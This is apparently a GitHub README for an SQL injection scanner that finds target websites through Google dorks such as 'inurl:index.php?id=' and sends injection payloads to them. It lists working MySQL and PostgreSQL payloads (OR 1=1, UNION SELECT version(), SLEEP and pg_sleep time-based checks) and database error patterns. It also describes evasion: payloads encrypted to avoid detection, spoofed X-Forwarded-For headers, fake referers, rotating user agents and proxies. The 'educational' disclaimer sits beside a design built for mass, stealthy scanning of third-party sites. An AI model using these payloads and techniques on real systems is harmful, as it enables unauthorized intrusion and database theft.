# SQLi-Inject  
**Comprehensive SQL Injection Dork Scanner**  

---

## 🔍 Main Features
- **Automatic Google Dorking** - Discover targets using the Google Custom Search API
- **Encrypted Payloads** - Encrypt payloads with Fernet to avoid detection
- **Multithreaded Scanning** - Parallel execution with ThreadPoolExecutor
- **Evasion Mechanisms**:
  - Random User-Agent rotation
  - Dynamic delay with jitter
  - Spoofing X-Forwarded-For header
  - Fake referer
- **Multi-Format Reporting** (JSON/CSV/Console)
- **Intelligent Detection**:
  - Response time analysis
  - Database error pattern matching
  - HTTP status code validation

---

## 🛠️ Installation
1. Clone the repository  
```bash
git clone https://github.com/KnuckleSalt/SQli-Dork
```

2. Install dependencies


```bash
pip install -r requirements.txt
```

---

⚙️ Configuration

Create a file named config.yaml using the following template:

```bash
security:
  encryption_key: "base64_32_byte_fernet_key"

payloads:
  mysql:
    - "gAAAAAB..."  # Encrypted MySQL payload
    - "gAAAAAB..."  # Example: ' OR 1=1 --
  postgresql:
    - "gAAAAAB..."  # Encrypted PostgreSQL payload

network:
  proxies:
    http: "http://proxy:port"
    https: "https://proxy:port"
  timeout: 10

endpoints:
  google: "https://www.googleapis.com/customsearch/v1"

credentials:
  api_key: "your_google_api_key"
  cse_id: "your_cse_id"

stealth:
  referers:
    - "https://www.google.com"
    - "https://www.bing.com"
  time_based_threshold: 3.5

performance:
  threads: 15

detection_patterns:
  - "error in your SQL syntax"
  - "Warning: mysql"
  - "PostgreSQL.*ERROR"
```

## 🔑 Generate Encryption Key

```
from cryptography.fernet import Fernet
print(Fernet.generate_key().decode())
```

## 🔒 Example Payload Encryption

```bash
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted_payload = cipher.encrypt(b"' OR 1=1 -- ").decode()
print(encrypted_payload)
```

## Example auto generate config.yaml

```bash
from cryptography.fernet import Fernet
import yaml

KEY = Fernet.generate_key()
cipher = Fernet(KEY)

payloads = {
    "mysql": [
        "' OR 1=1 -- ",
        "' UNION SELECT version(),2 -- ",
        "' AND 1=IF(2>1,SLEEP(5),0) -- "
    ],
    "postgresql": [
        "' OR 1=1; -- ",
        "' UNION SELECT NULL,version() -- ",
        "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END -- "
    ]
}

encrypted_payloads = {
    dbms: [cipher.encrypt(p.encode()).decode() for p in payloads[dbms]]
    for dbms in payloads
}

config = {
    'security': {'encryption_key': KEY.decode()},
    'payloads': encrypted_payloads,
    'network': {'timeout': 10, 'proxies': {}},
    'endpoints': {'google': 'https://www.googleapis.com/customsearch/v1'},
    'credentials': {'api_key': 'YOUR_APIKEY', 'cse_id': 'YOUR_CSE'},
    'stealth': {'referers': ['https://google.com'], 'time_based_threshold': 3.5},
    'detection_patterns': [
        r"SQL syntax.*MySQL",
        r"PostgreSQL.*ERROR",
        r"Warning.*mysql_",
        r"unclosed quotation mark"
    ],
    'performance': {'threads': 10}
}

with open('config.yaml', 'w') as f:
    yaml.dump(config, f, default_flow_style=False)

print("Config file generated successfully!")
```


---

## 🚀 Usage

Basic command:

```
python scanner.py --dork "inurl:index.php?id=" --max-results 50 --stealth
```

## Parameter options:

```
--dork          Google search query (required)
--site          Filter by domain
--file-type     Filter by file type
--max-results   Maximum number of results (1-100)
--stealth       Enable stealth mode
--jitter        Random delay variation (default: 0.5)
--delay         Base delay between requests (default: 1.0)
--random-agent  Random User-Agent rotation
--output        Report format (console/json/csv)
```

---

## ⚠️ Disclaimer

This tool is for educational and legal testing purposes only. Users are fully responsible for their own usage of this tool.


---

## 🙌 Special Thanks

Thanks to the open source contributors:

- [synnaulaid](https://github.com/synnaulaid) - Inspiration for developing security tools and debugging



---

